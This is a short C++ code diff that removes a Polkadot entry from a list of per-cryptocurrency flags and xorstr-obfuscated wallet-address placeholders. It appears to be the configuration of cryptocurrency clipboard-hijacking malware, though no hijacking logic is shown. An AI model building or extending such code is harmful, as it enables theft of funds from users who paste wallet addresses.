@@ -39,7 +39,6 @@ bool m_dash = true;
 bool m_tron = true;
 bool m_bnb = true;
 bool m_ada = true;
-bool m_dot = true;
 
 std::string btc = xorstr("btc addy");
 std::string ltc = xorstr("ltc addy");
@@ -53,4 +52,3 @@ std::string dash = xorstr("dash addy");
 std::string tron = xorstr("tron addy");
 std::string bnb = xorstr("bnb addy");
 std::string ada = xorstr("ada addy");
-std::string dot = xorstr("dot addy");
